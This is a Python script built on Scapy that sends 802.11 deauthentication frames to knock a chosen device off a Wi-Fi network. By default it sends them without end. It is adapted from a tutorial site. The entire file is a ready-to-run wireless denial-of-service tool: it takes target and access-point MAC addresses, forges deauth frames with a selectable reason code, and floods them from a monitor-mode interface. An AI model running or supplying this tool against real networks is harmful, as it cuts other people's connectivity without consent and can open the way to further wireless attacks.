#!/usr/bin/env python3
from scapy.all import *
import argparse

# source: https://www.thepythoncode.com/code/force-a-device-to-disconnect-scapy

def deauth(target_mac, gateway_mac, inter=0.1, count=None, loop=1, iface="wlp1s0mon", verbose=1):
    # ask user for the reason code that he wishes to use
    reason = int(input("Choose one reason code : \n"
                       "1 - Unspecified \n"
                       "4 - Disassociated due to inactivity \n"
                       "5 - Disassociated because AP is unable to handle all currently associated stations \n"
                       "8 - Deauthenticated because sending STA is leaving BSS \n"
                       "Reason code : "))
    
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC
    if reason == 1 or reason == 8:
        dot11 = Dot11(addr1=gateway_mac, addr2=target_mac, addr3=gateway_mac)
    elif reason == 4 or reason == 5:
        dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    else :
        print("Error, reason code cannot be handled")
        return

    # prepare the packet
    packet = RadioTap()/dot11/Dot11Deauth(reason=reason)
    
    # send the packet with all parameters
    sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=verbose)

if __name__ == "__main__":
    # add all arguments to parser
    parser = argparse.ArgumentParser(description="A python script for sending deauthentication frames")
    parser.add_argument("target", help="Target MAC address to deauthenticate.")
    parser.add_argument("gateway", help="Gateway MAC address that target is authenticated with")
    parser.add_argument("-c" , "--count", help="number of deauthentication frames to send, specify 0 to keep sending infinitely, default is 0", default=0)
    parser.add_argument("--interval", help="The sending frequency between two frames sent, default is 100ms", default=0.1)
    parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlp1s0mon'", default="wlp1s0mon")
    parser.add_argument("-v", "--verbose", help="wether to print messages", action="store_true")

    args = parser.parse_args()
    target = args.target
    gateway = args.gateway
    count = int(args.count)
    interval = float(args.interval)
    iface = args.iface
    verbose = args.verbose
    if count == 0:
        # if count is 0, it means we loop forever (until interrupt)
        loop = 1
        count = None
    else:
        loop = 0
    # printing some info messages"
    if verbose:
        if count:
            print(f"[+] Sending {count} frames every {interval}s...")
        else:
            print(f"[+] Sending frames every {interval}s for ever...")

    # call the function to deauthenticate the target
    deauth(target, gateway, interval, count, loop, iface, verbose)
